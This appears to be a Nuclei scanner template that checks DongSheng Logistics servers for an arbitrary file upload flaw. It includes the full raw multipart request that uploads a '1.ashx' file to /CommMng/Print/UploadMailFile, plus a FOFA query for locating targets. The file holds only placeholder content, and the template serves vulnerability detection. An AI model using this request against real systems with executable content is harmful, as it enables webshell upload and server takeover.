id: DongSheng-UploadMailFile

info: 
  name: 东胜物流 CommMngPrintUploadMailFile 任意文件上传
  author: proud
  severity: high
  description: fofa:body="dhtmlxcombo_whp.js"
  tags: upload file

http:
  - raw:
      - |-
        POST /CommMng/Print/UploadMailFile HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Length: 203


        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="LoadFile"; filename="1.ashx"
        Content-Type: application/octet-stream

        12312

        ------WebKitFormBoundary7MA4YWxkTrZu0gW--

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '  "success": true'
      - type: status
        status:
          - 200